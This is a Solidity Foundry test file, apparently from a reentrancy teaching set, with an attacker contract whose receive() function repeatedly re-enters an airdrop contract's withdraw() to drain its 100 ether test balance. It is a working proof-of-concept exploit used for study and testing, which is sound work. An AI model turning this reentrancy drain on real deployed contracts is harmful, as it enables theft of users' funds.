//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {airdrop} from "src/reentrancy/textbook/airdrop.sol";

contract attacker{
    airdrop public target;

    constructor(address _target){
        target=airdrop(payable((_target)));
    }

    function attack() public{
        target.eligible();
        target.withdraw();
    }

    receive() external payable{
        if (address(target).balance > msg.value){
            target.withdraw();
        }
    }
}

contract airdrop_test is Test{
    airdrop public target;
    attacker public hacker;
    function setUp() external{
        target = new airdrop();
        hacker = new attacker(address(target));
        vm.deal(address(target), 100 ether);
    }

    function test_airdrop() external{
        console.log("Attacker's balance before attack: ", address(hacker).balance);
        hacker.attack();
        console.log("Attacker's balance after attack: ", address(hacker).balance);
    }
}